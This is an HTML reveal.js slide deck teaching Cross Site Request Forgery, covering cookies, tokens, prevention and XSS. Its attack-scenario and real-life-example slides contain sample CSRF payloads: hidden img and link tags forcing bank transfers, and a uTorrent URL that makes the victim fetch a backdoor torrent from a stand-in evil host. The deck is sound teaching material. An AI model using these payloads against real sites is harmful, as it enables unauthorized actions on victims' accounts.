<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>reveal.js</title>

    <link rel="stylesheet" href="css/reveal.css">
    <link rel="stylesheet" href="css/theme/black.css">

    <!-- Theme used for syntax highlighting of code -->
    <link rel="stylesheet" href="lib/css/zenburn.css">

    <!-- Printing and PDF exports -->
    <script>
var link = document.createElement( 'link' );
link.rel = 'stylesheet';
link.type = 'text/css';
link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
document.getElementsByTagName( 'head' )[0].appendChild( link );
    </script>
  </head>
  <body>
    <div class="reveal">
      <div class="slides">
        <section data-markdown>
          # Cross Site Request Forgery
          ## (CSRF)

          by Rebecca Meritz
        </section>

<section data-markdown>
## What:
- Malicious program that causes a userâ€™s web browser to perform an unwanted action on a trusted site when the user is authenticated
</section>

<section data-markdown>
## Characteristics
- Involves sites that rely on a user's identity
- Exploits the site's trust in that identity
- Tricks the user's browser into sending HTTP requests to a target site
- Involves HTTP requests that have side effects
</section>

<section data-markdown>
## Sessions/Cookies

- HTTP is a stateless protocol
- Sessions allow it to be state-ful
- On authentication  the session is then saved in a cookie
- Cookie can be used following requests for temp authentication
- All cookies will be submitted with every request
</section>

<section data-markdown>
## Attack Scenario

1) Build a exploit URL/script

```
GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1

http://bank.com/transfer.do?acct=MARIA&amount=100000
```

2) Trick another user into executing the URL

```
&#060;a href="http://bank.com/transfer.do?acct=MARIA&amount=100000"&#062;View my
Pictures! &#060;/a&#062;

&#060;img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0"
height="0" border="0"&#062;
```
</section>

<section data-markdown>
## Real Life Examples
- ING bank transfers
- uTorrnet force torrent download `http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent`

- Netflix `&#060;img src="http://www.netflix.com/JSON/AddToQueue?movieid=70110672"
  /&#062;`
</section>

<section data-markdown>
## Prevention
- Check users origin + referer header
- Set samesite cookie attribute `SameSite=Strict`
- Force a user to reauthenticate, one-time token or a CATPTCHA
- **Add CSRF tokens to forms**
</section>

<section data-markdown>
## CSRF tokens

```
&#060;form action="/transfer.do" method="post"&#062;

&#060;input type="hidden" name="CSRFToken"
value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA=="&#062;
...
&#060;/form&#062;
```

- Long, unpredictable, unique strings generated by your server
- When forms are submitted check the CSRF token is present an matches the user
- Use in any request changing state (form POST, Ajax/XHR requests)
- State-f ul with synchronizer token || Stateless with encrypted/HMAC token
</section>

<section data-markdown>
## Common Mistakes:
- Setting token in URL for GET requests
  * Token can easily be stolen as URL info is user leaked via headers

- The human tendency to forget things at times:
 * Use wrappers to always add tokens to forms
 * Use hook to always check the token
</section>

<section data-markdown>
## Cross-site scripting (XSS)
- Someone else running code on your website
- Not necessary for CSRF to work
- Does defeat all CSRF mitigation techniques
- An XSS payload can simply read any page on the site including the token
- Example 2005  Samy worm
</section>

<section data-markdown>
## Sources
- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet
- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
- https://24ways.org/2018/securing-your-site-like-its-1999
- https://en.wikipedia.org/wiki/Cross-site_request_forgery
- https://medium.com/rubyinside/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef
- https://guides.rubyonrails.org/security.html
- https://rorsecurity.info/portfolio/cross-site-request-forgery-and-rail
</section>

      </div>
    </div>

    <script src="lib/js/head.min.js"></script>
    <script src="js/reveal.js"></script>

    <script>
// More info about config & dependencies:
// - https://github.com/hakimel/reveal.js#configuration
// - https://github.com/hakimel/reveal.js#dependencies
Reveal.initialize({
  dependencies: [
  { src: 'plugin/markdown/marked.js' },
  { src: 'plugin/markdown/markdown.js' },
  { src: 'plugin/notes/notes.js', async: true },
    { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
  ]
});
    </script>
  </body>
</html>
